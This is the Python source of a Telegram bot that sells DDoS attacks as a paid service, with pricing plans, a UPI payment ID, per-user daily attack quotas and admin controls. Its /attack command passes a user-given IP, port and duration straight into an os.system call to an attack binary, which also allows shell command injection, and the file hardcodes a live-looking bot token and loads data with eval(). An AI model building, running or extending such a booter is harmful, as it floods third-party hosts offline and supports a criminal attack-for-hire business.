import os
import threading
import asyncio
import time
import random
from datetime import datetime
from telegram import Update, InputMediaPhoto, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes, CallbackQueryHandler

# Updated credentials
TOKEN = "6838193855:AAFl6-Mke4I5uXP5IpRH659VRUGa_VJTQIA"
ADMIN_IDS = ["", "6512242172"]
GROUP_ID = "-1002656250196"

USER_FILE = "users.txt"
LOG_FILE = "log.txt"
LIMIT_FILE = "attack_limits.json"
RESET_FILE = "reset.txt"

authorized_users = set()
active_attacks = []
user_cooldowns = {}
attack_limits = {}

MAX_CONCURRENT_ATTACKS = 1
ATTACK_COOLDOWN = 10
MAX_ATTACK_DURATION = 180
DEFAULT_DAILY_LIMIT = 10

ATTACK_IMAGES = [
    "https://files.catbox.moe/abc123.jpg",
    "https://files.catbox.moe/abcxyz.jpg",
    "https://files.catbox.moe/xyzabc.jpg",
    "https://files.catbox.moe/xyz123.jpg",
    "https://files.catbox.moe/55faqg.jpg",
    "https://files.catbox.moe/qklv3b.jpg",
    "https://files.catbox.moe/7z3l72.jpg",
    "https://files.catbox.moe/eexckq.jpg",
    "https://files.catbox.moe/voutyl.jpg",
    "https://files.catbox.moe/c0qmrm.jpg",
    "https://files.catbox.moe/mltobn.jpg",
    "https://files.catbox.moe/voutyl.jpg",
    "https://files.catbox.moe/lrcgg2.jpg",
    "https://files.catbox.moe/tc7p1j.jpg",
    "https://files.catbox.moe/lu66mv.jpg",
    "https://files.catbox.moe/szpt44.jpg",
    "https://files.catbox.moe/ms3cbs.jpg",
    "https://files.catbox.moe/2g6hpa.jpg",
    "https://files.catbox.moe/a4qyv3.jpg",
    "https://files.catbox.moe/qmup2k.jpg",
    "https://files.catbox.moe/iqhw91.jpg",
    "https://files.catbox.moe/0u1huh.jpg",
    "https://files.catbox.moe/huhx40.jpg",
    "https://files.catbox.moe/x6gcnf.jpg",
    "https://files.catbox.moe/z0o6of.jpg",
    "https://files.catbox.moe/s40m6b.jpg",
    "https://files.catbox.moe/icr8ta.jpg",
    "https://files.catbox.moe/enx46y.jpg",
    "https://files.catbox.moe/8wikbx.jpg",
    "https://files.catbox.moe/9luucn.jpg",
    "https://files.catbox.moe/u6batq.jpg",
    "https://files.catbox.moe/tz0oul.jpg",
    "https://files.catbox.moe/8uatwv.jpg",
    "https://files.catbox.moe/bb8q8a.jpg",
    "https://files.catbox.moe/rkjwlq.jpg",
    "https://files.catbox.moe/ponfrg.jpg",
    "https://files.catbox.moe/8gn4ug.jpg",
    "https://files.catbox.moe/vmmhpp.jpg",
    "https://files.catbox.moe/9d8xde.jpg",
    "https://files.catbox.moe/72gdmb.jpg",
    "https://files.catbox.moe/cliay1.jpg",
    "https://files.catbox.moe/l3l17j.jpg",
    "https://files.catbox.moe/3vgdyi.jpg",
    "https://files.catbox.moe/iv7yfo.jpg",
    "https://files.catbox.moe/dbbcqn.jpg",
]




PLAN_IMAGE = "https://files.catbox.moe/1b21io.jpg"

def log_action(text):
    with open(LOG_FILE, "a") as f:
        f.write(f"[{datetime.now()}] {text}\n")

def load_users():
    if os.path.exists(USER_FILE):
        with open(USER_FILE, "r") as f:
            for line in f:
                user_id = line.strip().split(" - ")[0]
                authorized_users.add(user_id)

def save_user(user_id):
    now = datetime.now()
    formatted = now.strftime("%H:%M %d/%m/%Y")
    with open(USER_FILE, "a") as f:
        f.write(f"{user_id} - Added on {formatted}\n")

def remove_user_from_file(user_id):
    if os.path.exists(USER_FILE):
        with open(USER_FILE, "r") as f:
            lines = f.readlines()
        with open(USER_FILE, "w") as f:
            for line in lines:
                if not line.startswith(user_id):
                    f.write(line)

def load_limits():
    global attack_limits
    if os.path.exists(LIMIT_FILE):
        with open(LIMIT_FILE, "r") as f:
            attack_limits = eval(f.read())

def save_limits():
    with open(LIMIT_FILE, "w") as f:
        f.write(str(attack_limits))

def check_daily_reset():
    today = datetime.now().strftime("%Y-%m-%d")
    if not os.path.exists(RESET_FILE):
        with open(RESET_FILE, "w") as f:
            f.write(today)

    with open(RESET_FILE, "r") as f:
        last_reset = f.read().strip()

    if last_reset != today:
        for user in attack_limits:
            attack_limits[user]["used"] = 0
        save_limits()
        with open(RESET_FILE, "w") as f:
            f.write(today)
        log_action("✅ Daily attack limits reset.")

def is_authorized(chat_id, user_id):
    return (
        str(user_id) in ADMIN_IDS or
        str(chat_id) == GROUP_ID or
        str(user_id) in authorized_users or
        str(chat_id) in authorized_users
    )

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat_id = str(update.effective_chat.id)
    user_id = str(update.effective_user.id)
    if not is_authorized(chat_id, user_id):
        return

    start_message = """
╔════════════════════╗
       ʙᴏᴛ ɪɴғᴏʀᴍᴀᴛɪᴏɴ
╚════════════════════╝

<b>🚀 ʙᴏᴛ ɪs ᴏɴʟɪɴᴇ ᴀɴᴅ ʀᴇᴀᴅʏ!</b>

👑 <b>ᴏᴡɴᴇʀ:</b> @offx_sahil
📣 <b>ᴄʜᴀɴɴᴇʟ:</b> @Kasukabe_Personal0

ᴜsᴇ /help ᴛᴏ sᴇᴇ ᴀᴠᴀɪʟᴀʙʟᴇ ᴄᴏᴍᴍᴀɴᴅs.
"""
    await context.bot.send_message(
        chat_id=chat_id,
        text=start_message,
        parse_mode="HTML",
        disable_web_page_preview=True
    )

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_authorized(update.effective_chat.id, update.effective_user.id):
        return

    help_message = """
╔════════════════════╗
       ᴄᴏᴍᴍᴀɴᴅ ʟɪsᴛ
╚════════════════════╝

<b>🛠 ʙᴏᴛ ᴄᴏᴍᴍᴀɴᴅs:</b>

✅ /start - Show bot info
✅ /help - Show this message
✅ /attack [ip] [port] [time] - Start attack
✅ /status - Show active attacks
✅ /mylogs - Show your activity
✅ /plan - Show payment plans

<b>🔐 ᴀᴅᴍɪɴ ᴄᴏᴍᴍᴀɴᴅs:</b>

🔒 /approve [user] [limit] - Approve user
🔒 /adduser [id] - Add user
🔒 /removeuser [id] - Remove user
🔒 /clearstatus [slot] - Stop attack
🔒 /allusers - List users
🔒 /clearlogs - Clear logs
"""
    await context.bot.send_message(
        chat_id=update.effective_chat.id,
        text=help_message,
        parse_mode="HTML"
    )

async def plan_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    keyboard = [
        [InlineKeyboardButton("ᴠɪᴇᴡ ᴘᴀɪᴅ ᴘʟᴀɴ", callback_data='view_plan')]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    caption = """
<b>PAYMENT METHOD</b>

⭐️UPI ID - <code>sahilshah96900@axl</code> ✅ (tap to copy)

⭐️Contact @offx_sahil For More Info ✅
"""
    await context.bot.send_photo(
        chat_id=update.effective_chat.id,
        photo=PLAN_IMAGE,
        caption=caption,
        parse_mode="HTML",
        reply_markup=reply_markup
    )

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    if query.data == 'view_plan':
        plan_details = """
╔════════════════════╗
       ᴘʀᴇᴍɪᴜᴍ ᴘʟᴀɴs
╚════════════════════╝

<b>1 Day Plan</b> - ₹100
<b>7 Days Plan</b> - ₹500
<b>1 Month Plan</b> - ₹1200

<b>💳 Payment Method:</b>
UPI ID: <code>sahilshah96900@axl</code>

<b>📨 After Payment:</b>
Contact @offx_sahil with payment proof
"""
        await query.edit_message_caption(
            caption=plan_details,
            parse_mode="HTML"
        )

async def attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = str(update.effective_user.id)
    chat_id = str(update.effective_chat.id)
    user_name = update.effective_user.full_name

    if not is_authorized(chat_id, user_id):
        return await context.bot.send_message(
            chat_id=chat_id,
            text="⛔ <b>ᴜɴᴀᴜᴛʜᴏʀɪᴢᴇᴅ!</b>",
            parse_mode="HTML"
        )

    if user_id not in ADMIN_IDS:
        if user_id not in attack_limits:
            attack_limits[user_id] = {"limit": DEFAULT_DAILY_LIMIT, "used": 0}
        elif attack_limits[user_id]["used"] >= attack_limits[user_id]["limit"]:
            return await context.bot.send_message(
                chat_id=chat_id,
                text="❌ <b>ᴅᴀɪʟʏ ʟɪᴍɪᴛ ʀᴇᴀᴄʜᴇᴅ.</b>",
                parse_mode="HTML"
            )

    if len(context.args) != 3:
        return await context.bot.send_message(
            chat_id=chat_id,
            text="Usage: /attack [ip] [port] [time]",
            parse_mode="HTML"
        )

    ip, port, duration = context.args
    if not duration.isdigit() or int(duration) > MAX_ATTACK_DURATION:
        return await context.bot.send_message(
            chat_id=chat_id,
            text="⚕️ <b>Max time: 180 seconds.</b>",
            parse_mode="HTML"
        )

    if len(active_attacks) >= MAX_CONCURRENT_ATTACKS:
        return await context.bot.send_message(
            chat_id=chat_id,
            text="⚠️ <b>Max attacks running!</b>",
            parse_mode="HTML"
        )

    now = time.time()
    if user_id in user_cooldowns and now - user_cooldowns[user_id] < ATTACK_COOLDOWN:
        wait = int(ATTACK_COOLDOWN - (now - user_cooldowns[user_id]))
        return await context.bot.send_message(
            chat_id=chat_id,
            text=f"⏳ <b>Wait {wait}s before next attack.</b>",
            parse_mode="HTML"
        )

    user_cooldowns[user_id] = now
    attack_id = f"{chat_id}-{time.time()}"
    
    attack_image = random.choice(ATTACK_IMAGES)
    start_caption = f"""
╔════════════════════╗
       ᴀᴛᴛᴀᴄᴋ sᴛᴀʀᴛᴇᴅ
╚════════════════════╝

<b>🔥 ᴀᴛᴛᴀᴄᴋᴇʀ:</b> {user_name}
<b>🎯 ᴛᴀʀɢᴇᴛ:</b> <code>{ip}:{port}</code>
<b>⏱ ᴅᴜʀᴀᴛɪᴏɴ:</b> {duration}s

<b>⚠️ ᴀᴛᴛᴀᴄᴋ ɪɴ ᴘʀᴏɢʀᴇss...</b>
"""
    await context.bot.send_photo(
        chat_id=chat_id,
        photo=attack_image,
        caption=start_caption,
        parse_mode="HTML"
    )

    threading.Thread(target=execute_attack, args=(ip, port, duration, attack_id, chat_id, context, user_name)).start()

    log_action(f"UserID: {user_id} attack on {ip}:{port} for {duration}s")
    if user_id not in ADMIN_IDS:
        attack_limits[user_id]["used"] += 1
        save_limits()

def execute_attack(ip, port, duration, attack_id, chat_id, context, user_name):
    active_attacks.append(attack_id)
    os.system(f"./smokey {ip} {port} {duration} 1024 1800")
    asyncio.run(send_attack_finished_message(chat_id, ip, port, context, user_name))
    if attack_id in active_attacks:
        active_attacks.remove(attack_id)

async def send_attack_finished_message(chat_id, ip, port, context, user_name):
    attack_image = random.choice(ATTACK_IMAGES)
    finish_caption = f"""
╔════════════════════╗
       ᴀᴛᴛᴀᴄᴋ ᴄᴏᴍᴘʟᴇᴛᴇ
╚════════════════════╝

<b>✅ ᴀᴛᴛᴀᴄᴋ ғɪɴɪsʜᴇᴅ!</b>

<b>👤 ᴀᴛᴛᴀᴄᴋᴇʀ:</b> {user_name}
<b>🎯 ᴛᴀʀɢᴇᴛ:</b> <code>{ip}:{port}</code>

<b>⚡ ᴘᴏᴡᴇʀᴇᴅ ʙʏ:</b> @offx_sahil
"""
    await context.bot.send_photo(
        chat_id=chat_id,
        photo=attack_image,
        caption=finish_caption,
        parse_mode="HTML"
    )

async def status(update: Update, context: ContextTypes.DEFAULT_TYPE):
    count = len(active_attacks)
    status_msg = f"""
╔════════════════════╗
       ᴀᴛᴛᴀᴄᴋ sᴛᴀᴛᴜs
╚════════════════════╝

<b>📊 ᴀᴄᴛɪᴠᴇ ᴀᴛᴛᴀᴄᴋs:</b> {count}/{MAX_CONCURRENT_ATTACKS}
"""
    await context.bot.send_message(
        chat_id=update.effective_chat.id,
        text=status_msg,
        parse_mode="HTML"
    )

async def clearstatus(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if str(update.effective_user.id) not in ADMIN_IDS:
        return await context.bot.send_message(
            chat_id=update.effective_chat.id,
            text="⚠️ <b>Only admin.</b>",
            parse_mode="HTML"
        )
    if len(context.args) != 1 or not context.args[0].isdigit():
        return await context.bot.send_message(
            chat_id=update.effective_chat.id,
            text="Usage: /clearstatus [slot]",
            parse_mode="HTML"
        )
    slot = int(context.args[0])
    if slot < 1 or slot > len(active_attacks):
        return await context.bot.send_message(
            chat_id=update.effective_chat.id,
            text="⚠️ <b>Invalid slot.</b>",
            parse_mode="HTML"
        )
    removed = active_attacks.pop(slot - 1)
    log_action(f"Admin cleared attack: {removed}")
    await context.bot.send_message(
        chat_id=update.effective_chat.id,
        text=f"✅ <b>Cleared attack slot {slot}.</b>",
        parse_mode="HTML"
    )

async def allusers(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if str(update.effective_user.id) not in ADMIN_IDS:
        return await context.bot.send_message(
            chat_id=update.effective_chat.id,
            text="⚠️ <b>Admin only.</b>",
            parse_mode="HTML"
        )
    if os.path.exists(USER_FILE):
        with open(USER_FILE, "r") as f:
            content = f.read()
            response = f"<b>👥 Authorized users:</b>\n\n<code>{content}</code>" if content.strip() else "No users found."
    else:
        response = "No user file."
    await context.bot.send_message(
        chat_id=update.effective_chat.id,
        text=response,
        parse_mode="HTML"
    )

async def clearlogs(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if str(update.effective_user.id) not in ADMIN_IDS:
        return await context.bot.send_message(
            chat_id=update.effective_chat.id,
            text="⚠️ <b>Admin only.</b>",
            parse_mode="HTML"
        )
    open(LOG_FILE, "w").close()
    log_action("Admin cleared logs.")
    await context.bot.send_message(
        chat_id=update.effective_chat.id,
        text="🧹 <b>Logs cleared.</b>",
        parse_mode="HTML"
    )

async def mylogs(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = str(update.effective_user.id)
    if os.path.exists(LOG_FILE):
        with open(LOG_FILE, "r") as f:
            lines = [line for line in f.readlines() if f"UserID: {uid}" in line]
            reply = ''.join(lines[-5:]) if lines else "No logs found."
    else:
        reply = "No log file."
    await context.bot.send_message(
        chat_id=update.effective_chat.id,
        text=f"<b>📝 Your recent activity:</b>\n\n<code>{reply}</code>",
        parse_mode="HTML"
    )

async def adduser(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if str(update.effective_user.id) not in ADMIN_IDS:
        return await context.bot.send_message(
            chat_id=update.effective_chat.id,
            text="⚕️ <b>Only admin can add users.</b>",
            parse_mode="HTML"
        )
    if len(context.args) != 1:
        return await context.bot.send_message(
            chat_id=update.effective_chat.id,
            text="Usage: /adduser [id]",
            parse_mode="HTML"
        )
    uid = context.args[0]
    if uid in authorized_users:
        return await context.bot.send_message(
            chat_id=update.effective_chat.id,
            text="⚠️ <b>Already authorized.</b>",
            parse_mode="HTML"
        )
    authorized_users.add(uid)
    save_user(uid)
    log_action(f"Admin added: {uid}")
    await context.bot.send_message(
        chat_id=update.effective_chat.id,
        text=f"✅ <b>{uid} authorized.</b>",
        parse_mode="HTML"
    )

async def removeuser(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if str(update.effective_user.id) not in ADMIN_IDS:
        return await context.bot.send_message(
            chat_id=update.effective_chat.id,
            text="⚕️ <b>Only admin.</b>",
            parse_mode="HTML"
        )
    if len(context.args) != 1:
        return await context.bot.send_message(
            chat_id=update.effective_chat.id,
            text="Usage: /removeuser [id]",
            parse_mode="HTML"
        )
    uid = context.args[0]
    authorized_users.discard(uid)
    attack_limits.pop(uid, None)
    remove_user_from_file(uid)
    save_limits()
    log_action(f"Admin removed: {uid}")
    await context.bot.send_message(
        chat_id=update.effective_chat.id,
        text=f"✅ <b>{uid} removed.</b>",
        parse_mode="HTML"
    )

async def approve(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if str(update.effective_user.id) not in ADMIN_IDS:
        return await context.bot.send_message(
            chat_id=update.effective_chat.id,
            text="⚕️ <b>Only admin can use this.</b>",
            parse_mode="HTML"
        )
    if len(context.args) != 2:
        return await context.bot.send_message(
            chat_id=update.effective_chat.id,
            text="Usage: /approve [user_id] [limit]",
            parse_mode="HTML"
        )
    uid = context.args[0]
    limit = int(context.args[1])
    attack_limits[uid] = {"limit": limit, "used": 0}
    save_limits()
    await context.bot.send_message(
        chat_id=update.effective_chat.id,
        text=f"✅ <b>{uid} approved with limit {limit}.</b>",
        parse_mode="HTML"
    )

async def error_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    print(f"⚠️ Error occurred: {context.error}")
    if update and update.effective_message:
        await context.bot.send_message(
            chat_id=update.effective_chat.id,
            text="⚠️ <b>An error occurred while processing your request.</b>",
            parse_mode="HTML"
        )

def main():
    load_users()
    load_limits()
    check_daily_reset()
    for admin_id in ADMIN_IDS:
        authorized_users.add(admin_id)

    app = ApplicationBuilder().token(TOKEN).build()
    
    # Add handlers
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("help", help_command))
    app.add_handler(CommandHandler("attack", attack))
    app.add_handler(CommandHandler("status", status))
    app.add_handler(CommandHandler("clearstatus", clearstatus))
    app.add_handler(CommandHandler("mylogs", mylogs))
    app.add_handler(CommandHandler("adduser", adduser))
    app.add_handler(CommandHandler("removeuser", removeuser))
    app.add_handler(CommandHandler("clearlogs", clearlogs))
    app.add_handler(CommandHandler("allusers", allusers))
    app.add_handler(CommandHandler("approve", approve))
    app.add_handler(CommandHandler("plan", plan_command))
    app.add_handler(CallbackQueryHandler(button_handler))
    
    # Add error handler
    app.add_error_handler(error_handler)

    print("🤖 Bot is running...")
    app.run_polling()

if __name__ == "__main__":
    main()